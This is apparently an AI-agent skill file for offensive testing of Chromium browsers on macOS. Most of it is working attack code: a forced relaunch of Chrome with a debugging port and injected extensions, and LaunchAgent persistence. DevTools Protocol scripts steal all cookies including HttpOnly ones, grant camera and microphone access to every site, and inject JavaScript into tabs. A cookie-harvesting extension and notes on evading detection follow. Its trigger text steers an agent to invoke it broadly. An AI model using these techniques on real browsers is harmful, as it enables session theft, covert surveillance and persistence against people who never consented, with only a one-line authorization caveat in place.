---
name: macos-chromium-injection
description: Security testing skill for Chromium browser abuse on macOS. Use this skill when the user needs to test browser-based privilege escalation, session theft, or DevTools Protocol exploitation on macOS systems. Trigger this skill for any request involving Chrome/Edge/Brave security assessments, CDP exploitation, browser extension injection, or macOS browser hardening tests. Make sure to use this skill whenever the user mentions Chromium browsers, Chrome DevTools Protocol, browser security testing, or macOS browser exploitation scenarios.
---

# macOS Chromium Injection Testing

A security testing skill for authorized assessment of Chromium-based browsers on macOS. This skill covers browser flag manipulation, DevTools Protocol abuse, and extension-based injection techniques.

## ⚠️ Authorization Required

**Only use these techniques on systems you own or have explicit written authorization to test.** Unauthorized use may violate computer crime laws.

## When to Use This Skill

- Security assessments of macOS systems with Chromium browsers
- Red teaming exercises involving browser-based attacks
- Testing browser hardening configurations
- Evaluating endpoint detection capabilities
- Training on browser security concepts

## Core Concepts

Chromium-based browsers (Chrome, Edge, Brave, Arc, Vivaldi, Opera) share:
- Command-line switches and preference files
- DevTools automation interfaces (CDP)
- Extension APIs and debugging capabilities

On macOS, any user with GUI access can:
1. Force-quit an existing browser session
2. Relaunch with arbitrary flags/extensions
3. Expose DevTools Protocol endpoints
4. Run with the target's user entitlements

## Technique 1: Browser Flag Injection

### Launching with Custom Flags

```bash
# Force quit existing Chrome instance
osascript -e 'tell application "Google Chrome" to quit'

# Relaunch with instrumentation flags
open -na "Google Chrome" --args \
  --user-data-dir="$TMPDIR/chrome-test" \
  --remote-debugging-port=9222 \
  --load-extension="/path/to/extension" \
  --disable-extensions-except="/path/to/extension"
```

### Key Flags

| Flag | Purpose | Security Impact |
|------|---------|----------------|
| `--user-data-dir` | Redirect profile to custom path | Bypasses App-Bound Encryption on Chrome 136+ |
| `--remote-debugging-port` | Expose CDP over TCP | Enables remote browser control |
| `--load-extension` | Auto-load unpacked extensions | Bypasses extension installation prompts |
| `--disable-extensions-except` | Block all other extensions | Ensures only payload runs |
| `--use-fake-ui-for-media-stream` | Skip camera/mic prompts | Bypasses TCC permission checks |
| `--auto-select-desktop-capture-source` | Auto-select screen capture | Enables silent screen sharing |

### Persistence via LaunchAgent

```xml
<!-- ~/Library/LaunchAgents/com.chrome.instrumented.plist -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.chrome.instrumented</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/open</string>
    <string>-na</string>
    <string>Google Chrome</string>
    <string>--args</string>
    <string>--user-data-dir=/tmp/chrome-test</string>
    <string>--remote-debugging-port=9222</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
```

## Technique 2: Chrome DevTools Protocol (CDP) Abuse

### CDP Capabilities

Once `--remote-debugging-port` is active, you can:

1. **Extract cookies and sessions** (including HttpOnly)
2. **Grant permissions** (camera, mic, geolocation)
3. **Inject JavaScript** into active tabs
4. **Intercept network traffic** in real-time
5. **Modify DOM and page behavior**

### Cookie Extraction via CDP

```javascript
// scripts/extract-cookies.js
import CDP from 'chrome-remote-interface';

(async () => {
  const client = await CDP({host: '127.0.0.1', port: 9222});
  const {Network} = client;
  
  await Network.enable();
  const {cookies} = await Network.getAllCookies();
  
  console.log('Extracted cookies:');
  cookies.forEach(c => {
    console.log(`  ${c.domain}:${c.name} = ${c.value}`);
  });
  
  await client.close();
})();
```

### Permission Granting

```javascript
// scripts/grant-permissions.js
import CDP from 'chrome-remote-interface';

(async () => {
  const client = await CDP({host: '127.0.0.1', port: 9222});
  const {Browser} = client;
  
  // Grant camera, microphone, and geolocation
  await Browser.grantPermissions({
    origin: '*',
    permissions: ['camera', 'microphone', 'geolocation']
  });
  
  await client.close();
})();
```

### JavaScript Injection

```javascript
// scripts/inject-script.js
import CDP from 'chrome-remote-interface';

(async () => {
  const client = await CDP({host: '127.0.0.1', port: 9222});
  const {Runtime, Target} = client;
  
  // Get all targets (tabs)
  const {targetInfos} = await Target.getTargets();
  
  for (const target of targetInfos) {
    if (target.type === 'page') {
      const session = await Target.attachToTarget({targetId: target.targetId});
      const {result} = await session.send('Runtime.evaluate', {
        expression: 'document.cookie + "|" + window.location.href'
      });
      console.log(`${target.url}: ${result.result.value}`);
      await session.detachFromTarget();
    }
  }
  
  await client.close();
})();
```

## Technique 3: Extension-Based Injection

### Debugger API Extension

Create a minimal extension that uses `chrome.debugger` API:

```json
// extension/manifest.json
{
  "manifest_version": 3,
  "name": "Debugger Extension",
  "version": "1.0",
  "permissions": ["debugger", "tabs", "cookies"],
  "background": {
    "service_worker": "background.js"
  }
}
```

```javascript
// extension/background.js
chrome.tabs.onUpdated.addListener((tabId, info) => {
  if (info.status !== 'complete') return;
  
  chrome.debugger.attach({tabId}, '1.3', () => {
    // Enable network monitoring
    chrome.debugger.sendCommand({tabId}, 'Network.enable');
    
    // Extract cookies
    chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
      console.log('Cookies:', res.cookies);
      // Exfiltrate or process cookies here
    });
    
    // Listen for debugger events
    chrome.debugger.onEvent.addListener((source, method, params) => {
      if (method === 'Debugger.paused') {
        console.log('Debugger paused:', params);
      }
    });
  });
});
```

### Loading the Extension

```bash
# Launch Chrome with the extension pre-loaded
open -na "Google Chrome" --args \
  --user-data-dir="$TMPDIR/chrome-test" \
  --load-extension="/path/to/extension" \
  --disable-extensions-except="/path/to/extension"
```

## Technique 4: Network Traffic Interception

### Using CDP Fetch API

```javascript
// scripts/intercept-traffic.js
import CDP from 'chrome-remote-interface';

(async () => {
  const client = await CDP({host: '127.0.0.1', port: 9222});
  const {Fetch, Network} = client;
  
  await Fetch.enable({patterns: [{urlPattern: '*'}]});
  
  Fetch.requestPaused.addEventListener((event) => {
    console.log(`Request: ${event.request.url}`);
    console.log(`Headers:`, event.request.headers);
    
    // Continue request
    Fetch.continueRequest({requestId: event.requestId});
  });
  
  await new Promise(() => {}); // Keep running
})();
```

## Chrome 136+ Considerations

Starting with Chrome 136 (March 2025):

- `--remote-debugging-port` is **ignored** for the default profile
- You **must** use `--user-data-dir` with a non-standard path
- App-Bound Encryption protects the real profile
- Attackers must coerce authentication into the instrumented profile

### Workaround for Testing

```bash
# Create isolated profile for testing
mkdir -p "$TMPDIR/chrome-test"

# Launch with new profile
open -na "Google Chrome" --args \
  --user-data-dir="$TMPDIR/chrome-test" \
  --remote-debugging-port=9222
```

## Detection Evasion Considerations

### What Gets Logged

- Process creation events (launchd, auditd)
- Network connections to CDP port
- Extension installation (if not using `--load-extension`)
- File access to user-data-dir

### What Doesn't Get Logged

- CDP commands executed in-memory
- Cookie extraction via CDP (no filesystem access)
- Permission grants via CDP
- JavaScript injection via Runtime.evaluate

## Testing Checklist

- [ ] Verify authorization for target system
- [ ] Document baseline browser configuration
- [ ] Test flag injection on isolated system first
- [ ] Verify CDP port is accessible
- [ ] Test cookie extraction on test accounts
- [ ] Document all findings
- [ ] Clean up test artifacts

## References

- [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [Chrome Remote Interface](https://github.com/cyrus-and/chrome-remote-interface)
- [Chromium Command Line Switches](https://peter.sh/experiments/chromium-command-line-switches/)
- [Chrome Security Blog - Remote Debugging](https://developer.chrome.com/blog/remote-debugging-port)

## Related Tools

- `snoop` - Automates Chromium launches with payload extensions
- `VOODOO` - Traffic interception and browser instrumentation
- `puppeteer` - High-level CDP wrapper for automation
- `playwright` - Cross-browser automation with CDP support
